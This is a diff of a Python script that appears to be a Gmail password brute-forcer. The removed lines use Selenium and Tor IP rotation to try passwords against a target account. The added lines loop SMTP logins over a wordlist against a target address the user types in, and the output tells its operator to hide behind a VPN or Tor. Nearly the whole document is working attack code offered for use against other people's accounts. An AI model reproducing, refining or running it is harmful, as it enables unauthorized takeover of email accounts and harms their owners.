@@ -1,52 +1,85 @@
+# *  Author  : Akash Black Hat
+# *  GitHub  : https://github.com/akashblackhat
+# *  YouTub  : TECHNICAL AKASH SKILLS
+# *  FacebooK: https://shorturl.at/MO019
+# *  License : MIT
 
-# Gmail Brute Force Toolkit by BD Army
-# MISS YOU
+import smtplib, sys, os, random
+from os import system
 
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-from stem import Signal
-from stem.control import Controller
-import time
-import random
+OKGREEN = '\033[92m'
+WARNING = '\033[0;33m'
+FAIL = '\033[91m'
+ENDC = '\033[0m'
+LITBU = '\033[94m'
+YELLOW = '\033[3;33m'
+CYAN = '\033[0;36'
+colors = ['\033[92m', '\033[91m', '\033[0;33m']
+RAND = random.choice(colors)
 
-def change_ip():
-    with Controller.from_port(port=9051) as controller:
-        controller.authenticate()
-        controller.signal(Signal.NEWNYM)
+GMAIL_PORT = '587'
 
-def brute_force(username, password_file):
-    browser = webdriver.Firefox()
 
-    with open(password_file, 'r') as file:
-        passwords = file.readlines()
+# AKASH BANER
+def artwork():
+    print("\n")
+    print('''\033[32m
+      ██████╗  ███╗   ███╗  █████╗  ██╗ ██╗              
+     ██╔════╝  ████╗ ████║ ██╔══██╗ ██║ ██║            
+     ██║  ███╗ ██╔████╔██║ ███████║ ██║ ██║   
+     ██║   ██║ ██║╚██╔╝██║ ██╔══██║ ██║ ██║            
+     ╚██████╔╝ ██║ ╚═╝ ██║ ██║  ██║ ██║ ███████╗       
+      ╚═════╝  ╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═╝ ╚══════╝  v2.1  
+ ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
+ ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝
+ ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗
+ ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
+ ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
+ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        
+⚠️WARNING:I AM NOT RESPONSIBLE FOR THE MISUSE OF THIS TOOL !
+*******************************************************
+* Author   : Akash Black Hat
+* GitHub   : https://github.com/akashblackhat
+* YouTub   : TECHNICAL AKASH SKILLS
+* Instagram: akashblackhat
+* password : passworld.txt
+*************USE VPN OR TOR SERVICE********************
+''')
+artwork()
+smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
 
-    for password in passwords:
-        try:
-            change_ip()
-            browser.get("https://mail.google.com/")
-            time.sleep(2)
+smtp.ehlo()
+smtp.starttls()
 
-            user_elem = browser.find_element_by_name("identifier")
-            user_elem.clear()
-            user_elem.send_keys(username)
-            user_elem.send_keys(Keys.RETURN)
-            time.sleep(2)
+user = input("While The Target Gmail Adress: ")
+pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")
 
-            pass_elem = browser.find_element_by_name("password")
-            pass_elem.clear()
-            pass_elem.send_keys(password)
-            pass_elem.send_keys(Keys.RETURN)
-            time.sleep(3)
+if pwd == '0':
+    passswfile = "passworld.txt"
 
-            if "myaccount.google.com" in browser.current_url:
-                print(f"Password Found: {password}")
-                break
+elif pwd == '1':
+    print("\n")
+    passswfile = input("Name The File Path (For Password List):")
 
-        except Exception as e:
-            print(f"Error: {e}")
-            continue
+else:
+    print("\n")
+    print("Invalid input! Terminaling...")
+    sys.exit(1)
+try:
+    passswfile = open(passswfile, "r")
 
-    browser.quit()
+except Exception as e:
+    print(e)
+    sys.exit(1)
 
-# Example usage
-brute_force("target@gmail.com", "custom_passwords.txt")
+for password in passswfile:
+    try:
+        smtp.login(user, password)
+
+        print("[+] Password Found %s" % password)
+        break
+
+    except smtplib.SMTPAuthenticationError:
+        print("[-] Pasword Is Wrong. %s " % password)
+        # Author  : Akash Black Hat
+        #thank you hackers
